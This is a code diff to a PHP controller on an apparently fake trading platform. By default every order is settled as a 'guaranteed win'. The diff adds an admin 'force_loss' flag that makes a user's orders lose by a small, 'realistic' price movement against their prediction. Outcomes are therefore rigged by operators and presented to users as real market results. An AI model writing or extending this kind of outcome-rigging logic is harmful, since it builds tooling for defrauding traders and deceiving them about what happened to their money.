@@ -9,6 +9,7 @@ use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\DB;
 use App\Models\UserWallet;
+use App\Models\User;
 
 class TradeOrderController extends Controller
 {
@@ -146,15 +147,35 @@ class TradeOrderController extends Controller
             }
         }
 
-        // Calculate guaranteed win using the service
-        $result = $this->tradeService->calculateAmountBasedGuaranteedWin([
-            'user_id' => $order->user_id,
-            'symbol' => $order->symbol,
-            'direction' => $order->direction,
-            'purchase_price' => $order->purchase_price,
-            'purchase_quantity' => $order->purchase_quantity,
-            'price_range_percent' => $order->price_range_percent
-        ], $finalPrice);
+        // Check for admin-enforced forced-loss on the user. If set, generate a
+        // realistic losing result (small movement against user's prediction) via TradeService.
+        $user = User::find($order->user_id);
+        if ($user && !empty($user->force_loss)) {
+            $result = $this->tradeService->calculateForcedLoss([
+                'user_id' => $order->user_id,
+                'symbol' => $order->symbol,
+                'direction' => $order->direction,
+                'purchase_price' => $order->purchase_price,
+                'purchase_quantity' => $order->purchase_quantity,
+                'price_range_percent' => $order->price_range_percent
+            ], $finalPrice);
+
+            // Merge admin audit info into order meta
+            $result['meta'] = array_merge((array)$order->meta, (array)($result['meta'] ?? []), [
+                'admin_forced_loss' => true,
+                'admin_forced_loss_applied_at' => now()->toDateTimeString()
+            ]);
+        } else {
+            // Calculate guaranteed win using the service
+            $result = $this->tradeService->calculateAmountBasedGuaranteedWin([
+                'user_id' => $order->user_id,
+                'symbol' => $order->symbol,
+                'direction' => $order->direction,
+                'purchase_price' => $order->purchase_price,
+                'purchase_quantity' => $order->purchase_quantity,
+                'price_range_percent' => $order->price_range_percent
+            ], $finalPrice);
+        }
 
         // Update the order with calculated values
         // Only persist allowed keys to avoid accidental mass-assignment of unexpected fields
